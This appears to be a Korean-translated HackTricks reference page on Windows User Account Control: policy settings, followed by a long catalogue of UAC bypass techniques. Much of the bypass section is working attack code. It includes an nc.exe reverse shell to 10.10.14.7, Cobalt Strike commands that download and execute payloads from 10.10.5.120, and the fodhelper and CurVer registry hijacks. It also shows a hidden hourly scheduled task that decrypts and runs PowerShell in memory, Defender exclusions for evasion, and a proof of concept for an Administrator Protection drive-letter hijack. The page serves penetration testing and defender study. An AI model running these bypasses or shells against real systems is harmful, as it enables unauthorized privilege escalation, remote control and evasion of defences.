# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 는 권한 상승 작업에 대해 **승인 프롬프트를 표시**하도록 하는 기능입니다. 애플리케이션은 서로 다른 `integrity` 레벨을 가지며, **높은 레벨**의 프로그램은 **시스템을 손상시킬 수 있는 작업**을 수행할 수 있습니다. UAC가 활성화되어 있을 때, 애플리케이션과 작업은 관리자가 명시적으로 관리자 수준의 액세스 권한을 부여하지 않는 한 항상 **비관리자 계정의 보안 컨텍스트로 실행**됩니다. 이는 관리자가 의도하지 않은 변경으로부터 보호해 주는 편의 기능이지만, 보안 경계로 간주되지는 않습니다.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC가 적용되면, 관리자 계정에는 두 개의 토큰이 제공됩니다: 일반 작업을 수행하는 표준 사용자용 토큰과 관리자 권한을 가진 토큰입니다.

이 [페이지](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 는 UAC의 동작을 상세히 설명하며 로그온 프로세스, 사용자 경험 및 UAC 아키텍처를 포함합니다. 관리자는 보안 정책을 사용하여 조직에 맞게 UAC 동작을 로컬 수준(예: secpol.msc)에서 구성하거나 Active Directory 도메인 환경에서는 Group Policy Objects (GPO)를 통해 구성하여 배포할 수 있습니다. 다양한 설정은 [여기](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)에서 자세히 설명되어 있습니다. UAC에 대해 설정할 수 있는 Group Policy 설정은 10개가 있습니다. 다음 표는 추가 세부 정보를 제공합니다:

| 그룹 정책 설정                                                                                                                                                                                                                                                                                                                                                                 | 레지스트리 키                | 기본 설정                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (사용 안 함)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (보안 데스크톱에서 비-Windows 바이너리에 대해 동의 요청) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (보안 데스크톱에서 자격 증명 요청)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (사용; Enterprise에서는 기본적으로 비활성화)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (사용 안 함)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (사용)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (사용)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (사용 안 함)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (사용)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (사용)                                              |

### Policies for installing software on Windows

대부분의 시스템에서 로컬 보안 정책("secpol.msc")은 기본적으로 **비관리자 사용자가 소프트웨어를 설치하지 못하도록** 구성되어 있습니다. 즉, 비관리자 사용자가 소프트웨어 설치 프로그램을 다운로드할 수 있더라도 관리자 계정 없이는 실행할 수 없습니다.

### Registry Keys to Force UAC to Ask for Elevation

관리자 권한이 없는 표준 사용자로서 특정 작업을 시도할 때 UAC가 해당 "표준" 계정에 대해 **자격 증명을 요청하도록** 만들 수 있습니다. 이 작업은 특정 **레지스트리 키**를 수정해야 하며, 이를 위해서는 관리자 권한이 필요합니다. 단, **UAC bypass**가 있거나 공격자가 이미 관리자 계정으로 로그인한 경우는 예외입니다.

사용자가 Administrators 그룹에 있더라도, 이러한 변경은 관리 작업을 수행하기 위해 사용자가 **자격 증명을 다시 입력하도록 강제**합니다.

**유일한 단점은 이 방법이 작동하려면 UAC가 비활성화되어 있어야 한다는 점이며, 운영 환경에서는 그럴 가능성이 낮습니다.**

수정해야 하는 레지스트리 키와 항목(괄호 안은 기본값)은 다음과 같습니다:

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

이는 Local Security Policy 도구를 통해 수동으로도 설정할 수 있습니다. 변경 후에는 관리 작업이 사용자에게 자격 증명을 다시 입력하도록 요청합니다.

### 참고

**User Account Control은 보안 경계가 아닙니다.** 따라서 표준 사용자는 local privilege escalation exploit 없이는 계정에서 벗어나 관리자 권한을 얻을 수 없습니다.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC 권한

- Internet Explorer Protected Mode는 높은 무결성 수준 프로세스(예: 웹 브라우저)가 낮은 무결성 수준의 데이터(예: 임시 인터넷 파일 폴더)에 접근하는 것을 방지하기 위해 무결성 검사를 사용합니다. 이는 브라우저를 낮은 무결성 토큰으로 실행함으로써 이루어집니다. 브라우저가 낮은 무결성 영역에 저장된 데이터에 접근하려 하면 운영체제는 프로세스의 무결성 수준을 확인하고 이에 따라 접근을 허용합니다. 이 기능은 원격 코드 실행 공격이 시스템의 민감한 데이터에 접근하는 것을 방지하는 데 도움을 줍니다.
- 사용자가 Windows에 로그온하면 시스템은 사용자의 권한 목록을 포함한 access token을 생성합니다. 권한(privileges)은 사용자의 권리와 능력의 조합으로 정의됩니다. 토큰은 또한 컴퓨터 및 네트워크 상의 리소스에 대해 사용자를 인증하는 데 사용되는 credentials 목록도 포함합니다.

### Autoadminlogon

시작 시 특정 사용자를 자동으로 로그온시키려면 Windows에서 **`AutoAdminLogon` 레지스트리 키**를 설정하세요. 이는 키오스크 환경이나 테스트 목적에 유용합니다. 비밀번호가 레지스트리에 노출되므로 보안이 확보된 시스템에서만 사용하세요.

레지스트리 편집기 또는 `reg add`를 사용하여 다음 키를 설정하세요:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

정상적인 로그온 동작으로 되돌리려면 `AutoAdminLogon`을 0으로 설정하세요.

## UAC bypass

> [!TIP]
> 피해자에게 그래픽 접근이 가능한 경우, UAC 프롬프트가 뜰 때 단순히 "Yes"를 클릭하면 되므로 UAC 우회는 매우 간단하다는 점을 유의하세요

UAC 우회는 다음과 같은 상황에서 필요합니다: **UAC가 활성화되어 있고, 프로세스가 medium integrity 컨텍스트에서 실행 중이며, 사용자가 administrators 그룹에 속해 있는 경우**.

UAC가 가장 높은 보안 수준(Always)에 설정된 경우 다른 수준(Default)에 비해 UAC를 우회하는 것이 **훨씬 더 어렵다**는 점을 언급하는 것이 중요합니다.

### UAC disabled

UAC가 이미 비활성화되어 있다면(`ConsentPromptBehaviorAdmin`이 **`0`**) **관리자 권한이 있는 reverse shell**(high integrity level)을 다음과 같이 실행할 수 있습니다:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **매우** 기본적인 UAC "bypass" (full file system access)

Administrators group에 속한 user의 shell이 있다면 로컬에서 SMB (file system)를 통해 제공되는 C$ 공유를 새 드라이브에 **mount the C$** 하면 파일 시스템 내의 모든 항목에 **access to everything inside the file system** (심지어 Administrator home folder) 접근할 수 있습니다.

> [!WARNING]
> **이 트릭은 더 이상 작동하지 않는 것 같습니다**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### cobalt strike를 이용한 UAC bypass

The Cobalt Strike techniques는 UAC가 최대 보안 수준으로 설정되어 있지 않은 경우에만 작동합니다.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire**와 **Metasploit**에는 **UAC**를 **bypass**하기 위한 여러 모듈이 있습니다.

### KRBUACBypass

문서 및 도구: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)은 여러 UAC bypass exploits의 **모음**입니다. 참고: **visual studio나 msbuild를 사용해 UACME를 컴파일해야 합니다**. 컴파일하면 여러 실행 파일이 생성됩니다(예: `Source\Akagi\outout\x64\Debug\Akagi.exe`), 어떤 것을 사용해야 하는지 **알아야 합니다.**\
일부 bypass는 다른 프로그램을 **트리거할 수 있으며**, 이로 인해 무언가 발생하고 있음을 **사용자**에게 **알리게 되므로**, **주의해야 합니다**.
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

신뢰된 바이너리 `fodhelper.exe`는 최신 Windows에서 자동으로 관리자 권한으로 실행됩니다. 실행될 때 `DelegateExecute` verb를 검증하지 않고 아래의 사용자별 Registry 경로를 조회합니다. 거기에 명령을 심으면 Medium Integrity 프로세스(사용자가 Administrators)에 속함)가 UAC prompt 없이 High Integrity 프로세스를 생성할 수 있습니다.

fodhelper가 조회하는 Registry 경로:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell 단계 (payload를 설정한 다음 실행)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
노트:
- 현재 사용자가 Administrators 멤버이고 UAC 레벨이 기본/완화(default/lenient)인 경우에 작동합니다(추가 제한이 있는 Always Notify는 제외).
- 64-bit Windows에서 32-bit 프로세스가 64-bit PowerShell을 시작하도록 `sysnative` 경로를 사용하세요.
- Payload는 PowerShell, cmd 또는 EXE 경로 등 어떤 명령이든 될 수 있습니다. 은밀성을 위해 사용자 입력을 요구하는 UI는 피하세요.

#### CurVer/extension hijack variant (HKCU only)

최근 샘플들은 `fodhelper.exe`를 악용하여 `DelegateExecute`를 회피하고 대신 사용자별 `CurVer` 값을 통해 **`ms-settings` ProgID를 리다이렉트**합니다. auto-elevated 바이너리는 여전히 `HKCU` 하위에서 핸들러를 해석하므로 키를 심기 위해 admin token이 필요하지 않습니다:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
권한 상승 후, 악성코드는 일반적으로 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin`를 `0`으로 설정하여 **향후 프롬프트를 비활성화**한 다음, 추가적인 방어 회피(예: `Add-MpPreference -ExclusionPath C:\ProgramData`)를 수행하고 높은 무결성으로 실행되도록 persistence를 재구성합니다. 일반적인 persistence 작업은 디스크에 **XOR-encrypted PowerShell script**를 저장하고 매시간 이를 메모리에서 디코드/실행합니다:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
이 변형은 여전히 dropper를 정리하고 staged payloads만 남기므로, 탐지는 **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` 변조, Defender 제외 생성, 또는 메모리에서 PowerShell을 복호화하는 예약 작업을 모니터링하는 것에 의존합니다.

#### 추가 UAC bypass

**여기서** AUC를 우회하는 데 사용되는 **모든** 기법은 피해자와의 **full interactive shell**을 **필요로 합니다** (일반적인 nc.exe 쉘로는 충분하지 않습니다).

**meterpreter** 세션을 사용하면 얻을 수 있습니다. **Session** 값이 **1**인 **process**로 마이그레이션하세요:

![](<../../images/image (863).png>)

(_explorer.exe_가 작동해야 합니다)

### GUI로 UAC Bypass

GUI에 접근할 수 있다면 **UAC 프롬프트를 그냥 수락할 수 있습니다**, 실제로 우회가 필요 없습니다. 따라서 GUI 접근을 얻으면 UAC를 우회할 수 있습니다.

게다가 누군가 사용 중이던 GUI 세션(예: RDP로 접속한)에서는 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)와 같은 도구들이 **관리자 권한으로 실행되고 있을 수 있으며**, 그 환경에서는 예를 들어 **cmd**를 **as admin**으로 바로 실행해 UAC 프롬프트를 다시 받지 않을 수 있습니다. 이것은 다소 더 **stealthy**할 수 있습니다.

### Noisy brute-force UAC bypass

시끄럽게 구는 것을 신경 쓰지 않는다면 **이런 도구를 실행할 수 있습니다** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin); 이 도구는 **사용자가 수락할 때까지 권한 상승을 요청합니다**.

### 자체 우회 - Basic UAC bypass methodology

**UACME**를 보면 **대부분의 UAC 우회는 Dll Hijacking 취약점을 악용한다는 것**을 알 수 있습니다(주로 악성 dll을 _C:\Windows\System32_에 쓰는 방식). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. 실행 시 높은 무결성 수준에서 실행되는지 확인하여 **autoelevate**하는 바이너리를 찾습니다.
2. procmon으로 "**NAME NOT FOUND**" 이벤트를 찾아 **DLL Hijacking**에 취약한지 확인합니다.
3. 쓰기 권한이 없는 **protected paths**(예: C:\Windows\System32)에 DLL을 **write**해야 할 수 있습니다. 이를 우회하기 위해 다음을 사용할 수 있습니다:
1. **wusa.exe**: Windows 7,8 and 8.1. 이 도구는 높은 무결성 수준에서 실행되기 때문에 CAB 파일의 내용을 protected paths 안으로 추출할 수 있습니다.
2. **IFileOperation**: Windows 10.
4. DLL을 보호된 경로로 복사하고 취약하고 autoelevated된 바이너리를 실행하는 **script**를 준비합니다.

### 또 다른 UAC bypass 기술

이는 **autoElevated binary**가 **registry**에서 실행될 **binary**나 **command**의 **name/path**를 **read**하려고 하는지를 관찰하는 것입니다(해당 바이너리가 이 정보를 **HKCU** 내에서 검색하면 더 흥미롭습니다).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection”은 per-session `\Sessions\0\DosDevices/<LUID>` 맵을 가진 shadow-admin 토큰을 사용합니다. 해당 디렉터리는 첫 번째 `\??` 해석 시 `SeGetTokenDeviceMap`에 의해 지연 생성됩니다. 공격자가 shadow-admin 토큰을 **SecurityIdentification** 단계에서만 가장하여 디렉터리가 공격자를 **owner**로 하여 생성되면(`CREATOR OWNER` 상속), `\GLOBAL??`보다 우선하는 drive-letter 링크를 허용하게 됩니다.

**Steps:**

1. 낮은 권한 세션에서 `RAiProcessRunOnce`를 호출해 프롬프트 없는 shadow-admin `runonce.exe`를 생성합니다.
2. 해당 프로세스의 기본 토큰을 **identification** 토큰으로 복제하고 `\??`를 열 때 이를 가장(impersonate)하여 `\Sessions\0\DosDevices/<LUID>`가 공격자 소유로 생성되도록 강제합니다.
3. 그 위치에 공격자가 제어하는 저장소를 가리키는 `C:` 심링크를 생성합니다; 이후 해당 세션의 파일시스템 접근은 `C:`를 공격자 경로로 해석하여 프롬프트 없이 DLL/파일 하이재킹을 가능하게 합니다.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## 참고자료
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass 단계](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – User Account Control 작동 방식](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques 모음](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI가 AI로 PowerShell Backdoors 생성](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
